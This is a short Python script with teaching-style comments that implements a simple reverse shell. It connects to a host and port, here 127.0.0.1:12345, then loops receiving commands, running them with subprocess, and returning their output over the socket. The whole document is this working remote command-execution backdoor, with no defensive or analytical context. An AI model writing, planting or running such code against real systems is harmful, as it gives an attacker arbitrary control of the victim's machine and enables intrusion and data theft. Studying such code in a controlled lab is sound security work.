import socket
import subprocess

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

HOST = '127.0.0.1'
PORT = 12345

sock.connect((HOST, PORT))

while True:
    # We receive a command and decode it.
    command = sock.recv(1024).decode()

    # Then, we split it into arguments.
    # For example, `ls -l` gets turned into `[ls, -l]`.
    args = command.split()

    # We run the command and get the result.
    result = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    # We send the result directly back to the host.
    sock.send(result.stdout)
